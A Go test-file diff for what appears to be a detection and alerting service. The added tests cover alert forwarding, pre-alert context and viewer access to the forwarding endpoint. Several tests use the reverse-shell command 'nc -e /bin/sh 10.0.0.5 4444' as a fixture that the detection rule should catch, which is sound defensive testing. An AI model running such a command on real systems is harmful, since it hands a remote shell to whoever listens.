@@ -8,10 +8,14 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 
+	"context"
+
 	"defendsec/internal/events"
+	"defendsec/internal/forward"
 	"defendsec/internal/presence"
 	"defendsec/internal/sigma"
 )
@@ -284,4 +288,167 @@ func stringsOf(v any) []string {
 
 func osWriteFile(path, body string) error {
 	return os.WriteFile(path, []byte(body), 0o600)
+}
+
+// Forwarding must never affect detection: a stalled collector cannot be
+// allowed to slow rule matching or alerting.
+func TestForwardingDoesNotAffectDetection(t *testing.T) {
+	s := detectionServer(t, reverseShellRule)
+	slow := &blockingDest{}
+	f := forward.New(4, slow)
+	defer f.Close()
+	s.SetForwarder(f)
+
+	ev := &events.Event{
+		ID: "e", DeviceID: "dev-1", Hostname: "host-1",
+		Kind: events.KindProcess, At: time.Now().UTC(), PID: 300, PPID: 1,
+	}
+	ev.Set(events.FieldImage, "/usr/bin/nc")
+	ev.Set(events.FieldCommandLine, "nc -e /bin/sh 10.0.0.5 4444")
+
+	start := time.Now()
+	s.HandleEventBatch("dev-1", "host-1", &defendsecEventBatch{Events: []*events.Event{ev}})
+	if elapsed := time.Since(start); elapsed > 2*time.Second {
+		t.Fatalf("detection took %s behind a stalled forwarder", elapsed)
+	}
+	if len(s.store.ListAlerts("", "", "", 100)) != 1 {
+		t.Error("the alert was not raised while forwarding was stalled")
+	}
+}
+
+type blockingDest struct{}
+
+func (blockingDest) Name() string { return "blocking" }
+func (blockingDest) Send(ctx context.Context, _ []forward.Record) error {
+	<-ctx.Done()
+	return ctx.Err()
+}
+func (blockingDest) Close() error { return nil }
+
+// An alert has to reach the operator's platform too: for many operators the
+// collector is the system of record.
+func TestAlertsAreForwarded(t *testing.T) {
+	s := detectionServer(t, reverseShellRule)
+	dest := &recordingDest{}
+	f := forward.New(0, dest)
+	defer f.Close()
+	s.SetForwarder(f)
+
+	ev := &events.Event{
+		ID: "e", DeviceID: "dev-1", Hostname: "host-1",
+		Kind: events.KindProcess, At: time.Now().UTC(), PID: 300, PPID: 1,
+	}
+	ev.Set(events.FieldImage, "/usr/bin/nc")
+	ev.Set(events.FieldCommandLine, "nc -e /bin/sh 10.0.0.5 4444")
+	s.HandleEventBatch("dev-1", "host-1", &defendsecEventBatch{Events: []*events.Event{ev}})
+
+	deadline := time.Now().Add(10 * time.Second)
+	for time.Now().Before(deadline) {
+		if dest.has("alert") && dest.has("event") {
+			return
+		}
+		time.Sleep(10 * time.Millisecond)
+	}
+	t.Fatalf("forwarded records = %v", dest.kinds())
+}
+
+type recordingDest struct {
+	mu  sync.Mutex
+	got []forward.Record
+}
+
+func (r *recordingDest) Name() string { return "recording" }
+func (r *recordingDest) Send(_ context.Context, records []forward.Record) error {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	r.got = append(r.got, records...)
+	return nil
+}
+func (r *recordingDest) Close() error { return nil }
+func (r *recordingDest) has(kind string) bool {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	for _, rec := range r.got {
+		if rec.Kind == kind {
+			return true
+		}
+	}
+	return false
+}
+func (r *recordingDest) kinds() []string {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	var out []string
+	for _, rec := range r.got {
+		out = append(out, rec.Kind)
+	}
+	return out
+}
+
+// The first question an analyst asks is what else the host was doing just
+// before, which is why the short window exists at all.
+func TestAlertCarriesPreAlertContext(t *testing.T) {
+	s := detectionServer(t, reverseShellRule)
+	base := time.Now().UTC().Add(-time.Minute)
+
+	batch := &defendsecEventBatch{}
+	for i, cmd := range []string{"whoami", "id", "uname -a"} {
+		e := &events.Event{
+			ID: fmt.Sprintf("ctx%d", i), DeviceID: "dev-1", Hostname: "host-1",
+			Kind: events.KindProcess, At: base.Add(time.Duration(i) * time.Second),
+			PID: int32(200 + i), PPID: 1,
+		}
+		e.Set(events.FieldImage, "/usr/bin/"+strings.Fields(cmd)[0])
+		e.Set(events.FieldCommandLine, cmd)
+		batch.Events = append(batch.Events, e)
+	}
+	bad := &events.Event{
+		ID: "bad", DeviceID: "dev-1", Hostname: "host-1",
+		Kind: events.KindProcess, At: base.Add(10 * time.Second), PID: 300, PPID: 1,
+	}
+	bad.Set(events.FieldImage, "/usr/bin/nc")
+	bad.Set(events.FieldCommandLine, "nc -e /bin/sh 10.0.0.5 4444")
+	batch.Events = append(batch.Events, bad)
+
+	s.HandleEventBatch("dev-1", "host-1", batch)
+
+	alerts := s.store.ListAlerts("", "", "", 100)
+	if len(alerts) != 1 {
+		t.Fatalf("alerts = %d", len(alerts))
+	}
+	raw, ok := alerts[0].Detail["event.context"]
+	if !ok {
+		t.Fatal("the alert carries no pre-alert context")
+	}
+	encoded, _ := json.Marshal(raw)
+	for _, want := range []string{"whoami", "uname -a"} {
+		if !strings.Contains(string(encoded), want) {
+			t.Errorf("context is missing %q: %s", want, encoded)
+		}
+	}
+}
+
+// An unconfigured forwarder has to state the positioning rather than looking
+// like a healthy one with nothing to do.
+func TestForwardingEndpointStatesPositioning(t *testing.T) {
+	s := testServer()
+	req := httptest.NewRequest(http.MethodGet, "/v1/detection/forwarding", nil)
+	req.Header.Set("Authorization", "Bearer admin-token")
+	rec := httptest.NewRecorder()
+	s.HandleForwarding(rec, req)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("status=%d", rec.Code)
+	}
+	if !strings.Contains(rec.Body.String(), "not a log store") {
+		t.Errorf("body = %s", rec.Body.String())
+	}
+
+	// Destination addresses are part of the operator's infrastructure map.
+	viewer := httptest.NewRequest(http.MethodGet, "/v1/detection/forwarding", nil)
+	viewer.Header.Set("Authorization", "Bearer viewer-token")
+	rec = httptest.NewRecorder()
+	s.HandleForwarding(rec, viewer)
+	if rec.Code != http.StatusUnauthorized {
+		t.Errorf("a viewer read the forwarding destinations: %d", rec.Code)
+	}
 }
